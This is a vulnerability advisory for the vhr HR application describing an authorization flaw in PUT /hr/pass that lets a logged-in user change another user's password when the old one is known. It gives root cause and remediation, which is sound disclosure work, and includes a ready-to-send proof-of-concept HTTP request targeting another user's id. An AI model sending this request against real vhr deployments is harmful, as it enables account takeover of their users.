# vhr（微人事） — IDOR in PUT /hr/pass (VHR-VULN-009)

| Field | Value |
|-------|-------|
| **Vendor** | lenve |
| **Product** | vhr（微人事） |
| **Version** | 1.0-SNAPSHOT |
| **Type** | Improper Authorization |
| **CWE** | CWE-285 |
| **Authentication** | Any logged-in user |

## Summary

`hrid` parameter is not bound to session user; attacker changes any user's password if old password known.

## Root cause

`HrInfoController.updatePass()` — no `hrid == currentUser.id` check.

## Proof of Concept

```http
PUT /hr/pass HTTP/1.1
Host: TARGET
Content-Type: application/json
Cookie: JSESSIONID=SESSION_LIBAI
Connection: close

{"hrid":3,"oldpass":"123","pass":"IdorPoc456!"}
```

**Expected:** {"status":200,"msg":"更新成功!"}

## Impact

Account takeover when default/weak passwords exist (chains with VHR-VULN-008).

## Remediation

Ignore client `hrid`; use authenticated principal id only.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §VHR-VULN-009
- PoC: `POC_VERIFICATION_REPORT.md`
